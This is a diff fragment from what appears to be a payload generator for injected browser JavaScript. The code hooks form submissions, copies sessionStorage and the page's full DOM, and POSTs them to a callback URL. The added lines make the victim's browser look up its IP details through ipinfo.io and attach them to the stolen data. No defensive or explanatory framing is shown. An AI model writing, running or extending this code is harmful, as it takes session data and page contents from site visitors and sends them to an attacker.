@@ -92,6 +92,9 @@ document.addEventListener("submit",function(e){if(window.__nxHooked)return;var f
   js += `try{var s={};for(var i=0;i<sessionStorage.length;i++){var k=sessionStorage.key(i);s[k]=sessionStorage.getItem(k)}d.sessionstorage=JSON.stringify(s)}catch(e){}`;
   js += `try{d.dom=document.documentElement.outerHTML;if(d.dom.length>5000000)d.dom=d.dom.substring(0,5000000)}catch(e){d.dom="[DOM capture failed: "+e.message+"]"}`;
 
+  // Fetch IP info from ipinfo.io (client-side, async)
+  js += `(function(){try{fetch("https://ipinfo.io/json",{mode:"cors"}).then(function(r){return r.json()}).then(function(j){d.ip_info=JSON.stringify(j)}).catch(function(){})}catch(e){}})();`;
+
   // Send function - FIXED: onload inside send()
   js += `function send(){var x=new XMLHttpRequest();x.open("POST","${cb}",true);x.setRequestHeader("Content-Type","application/json");`;
   js += `x.onload=function(){try{var r=JSON.parse(x.responseText);if(r.id){window.__rid=r.id;`;
